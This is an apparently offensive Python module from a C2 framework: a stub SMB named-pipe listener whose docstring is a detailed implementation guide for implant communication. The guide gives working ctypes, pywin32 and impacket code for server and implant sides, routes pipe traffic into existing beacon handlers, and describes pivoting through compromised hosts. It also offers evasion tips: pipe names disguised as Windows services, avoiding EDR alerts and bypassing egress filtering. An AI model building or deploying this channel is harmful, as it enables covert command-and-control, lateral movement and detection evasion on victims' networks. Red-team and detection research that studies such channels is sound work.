"""SMB Named Pipe Listener — STUB with full implementation guide.

SMB named pipes allow two processes (or machines, over the network) to
communicate through the Windows file system namespace.  From a C2 perspective
this is attractive because:

  - Named pipe traffic rides inside SMB (port 445), which is often allowed
    internally even when direct TCP egress is blocked
  - Looks like normal Windows admin / file-sharing traffic
  - Can be proxied through an already-compromised Windows host (lateral pivot)

Architecture
~~~~~~~~~~~~

    [Implant]  ──SMB connect──►  [Pivot host :445]
                                        │  Named pipe (\\\\pivot\\pipe\\svc)
                               Reads pipe data → forwards to C2

    OR in "local pipe" mode (same host, no network):

    [Implant process]  ──CreateFile(\\\\.\\pipe\\name)──►  [Listener thread]

Requirements
~~~~~~~~~~~~
On Windows, the Win32 API (available in any Python process) can create and
serve named pipes.  No third-party packages required if using ctypes.

For cross-platform access to remote named pipes (implant running on Linux
connecting to a Windows target), use impacket:

    pip install impacket

Implementation guide — server side (Windows)
---------------------------------------------

Option A: ctypes / win32pipe (implant host IS Windows)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    import ctypes
    import ctypes.wintypes as wt

    # Win32 constants
    PIPE_ACCESS_DUPLEX       = 0x00000003
    PIPE_TYPE_MESSAGE        = 0x00000004
    PIPE_READMODE_MESSAGE    = 0x00000002
    PIPE_WAIT                = 0x00000000
    NMPWAIT_USE_DEFAULT_WAIT = 0x00000000
    INVALID_HANDLE_VALUE     = ctypes.c_void_p(-1).value

    PIPE_NAME = r"\\\\.\\pipe\\WindowsUpdateAgent"   # blend with svchost

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

    def create_pipe():
        h = kernel32.CreateNamedPipeW(
            PIPE_NAME,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1,       # max instances
            65536,   # out buffer size
            65536,   # in buffer size
            NMPWAIT_USE_DEFAULT_WAIT,
            None,    # default security (only SYSTEM + Admins can connect by default)
        )
        if h == INVALID_HANDLE_VALUE:
            raise ctypes.WinError(ctypes.get_last_error())
        return h

    def serve_one(pipe_h):
        # Block until a client connects
        kernel32.ConnectNamedPipe(pipe_h, None)

        buf = ctypes.create_string_buffer(65536)
        bytes_read = wt.DWORD(0)

        while True:
            ok = kernel32.ReadFile(
                pipe_h, buf, 65536, ctypes.byref(bytes_read), None
            )
            if not ok:
                break

            data = buf.raw[:bytes_read.value]
            response = handle_c2_message(data)   # your C2 dispatch

            written = wt.DWORD(0)
            kernel32.WriteFile(
                pipe_h, response, len(response), ctypes.byref(written), None
            )

        kernel32.DisconnectNamedPipe(pipe_h)
        kernel32.CloseHandle(pipe_h)

    # Main loop: create a new pipe instance for each connection
    while True:
        h = create_pipe()
        serve_one(h)

Option B: pywin32 (friendlier API)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    import win32pipe, win32file, pywintypes

    PIPE_NAME = r"\\\\.\\pipe\\SvcHealth"

    h = win32pipe.CreateNamedPipe(
        PIPE_NAME,
        win32pipe.PIPE_ACCESS_DUPLEX,
        win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_WAIT,
        1, 65536, 65536, 0, None
    )

    win32pipe.ConnectNamedPipe(h, None)   # blocks until implant connects
    _, data = win32file.ReadFile(h, 65536)
    win32file.WriteFile(h, b"ack")
    win32pipe.DisconnectNamedPipe(h)
    win32file.CloseHandle(h)

Implementation guide — implant side (client)
---------------------------------------------

Option A: ctypes (Windows)
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    import ctypes
    PIPE_NAME = r"\\\\.\\pipe\\WindowsUpdateAgent"

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    h = kernel32.CreateFileW(
        PIPE_NAME,
        0xC0000000,  # GENERIC_READ | GENERIC_WRITE
        0, None,
        3,           # OPEN_EXISTING
        0, None,
    )
    # Write task request
    kernel32.WriteFile(h, data, len(data), ctypes.byref(written), None)
    # Read response
    kernel32.ReadFile(h, buf, 65536, ctypes.byref(bytes_read), None)

Option B: impacket SMBConnection (cross-platform, remote pivot)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    from impacket.smbconnection import SMBConnection

    smb = SMBConnection("10.0.0.5", "10.0.0.5")
    smb.login("", "", domain="")   # null session or use creds

    # Open the named pipe as if it were a file share path
    tid = smb.connectTree("IPC$")
    fid = smb.openFile(tid, "\\\\pipe\\\\WindowsUpdateAgent")

    smb.writeFile(tid, fid, b"beacon_data")
    data = smb.readFile(tid, fid, bytesToRead=65536)
    smb.closeFile(tid, fid)
    smb.disconnectTree(tid)

Implementation guide — C2-side integration
------------------------------------------
When a client (implant) connects to the named pipe:
1. Read the request bytes (same JSON framing as HTTP C2)
2. Route to the same handler as an HTTP /beacon or /result call
3. Write the JSON response back

This means the SMB listener can share the same session DB and task queue as
the HTTP listener — it's just a different transport layer.

    def handle_c2_message(data: bytes) -> bytes:
        try:
            msg = json.loads(data)
        except Exception:
            return json.dumps({"error": "bad request"}).encode()

        path = msg.get("path", "/beacon")
        body = msg.get("body", {})

        # Re-use existing C2 logic
        if path == "/beacon":
            return json.dumps(_handle_beacon(body)).encode()
        elif path == "/result":
            return json.dumps(_handle_result(body)).encode()
        else:
            return json.dumps({"error": "unknown"}).encode()

Security considerations
-----------------------
- Use a DACL to restrict pipe access to specific users (not everyone)
- Named pipes can be enumerated by any local user (PipeList / Sysinternals)
- Use a non-obvious pipe name but avoid obviously-fake names
- Pipe traffic is NOT encrypted by default; implement the same AES-GCM
  envelope used by the HTTP C2 before treating the pipe as production-ready
- Windows Defender / EDR products hook NtCreateNamedPipeFile and will alert
  on suspicious pipe names; test against your EDR before deploying

Evasion tips
------------
- Use pipe names that match legitimate Windows services:
    \\\\pipe\\\\wkssvc, \\\\pipe\\\\svcctl, \\\\pipe\\\\browser
  (but be careful — connecting to the real pipe name collides with the OS)
- Alternatively blend with named software:
    \\\\pipe\\\\SQLLocalDB, \\\\pipe\\\\GoogleCrashServices
- For lateral movement, initiate the connection from the implant side;
  this avoids needing an inbound firewall rule on the target
"""

from __future__ import annotations

IMPLEMENTED = False


class SMBPipeListener:
    """SMB named pipe C2 listener.

    NOT YET IMPLEMENTED.  See module docstring for the full implementation guide.
    """

    def __init__(self, pipe_name: str = r"\\.\pipe\WindowsUpdateAgent"):
        self.pipe_name = pipe_name

    def start(self) -> None:
        raise NotImplementedError(
            "SMB named pipe listener is not yet implemented. "
            "See major/listeners/smb.py for the full implementation guide."
        )

    def stop(self) -> None:
        pass

    @property
    def running(self) -> bool:
        return False
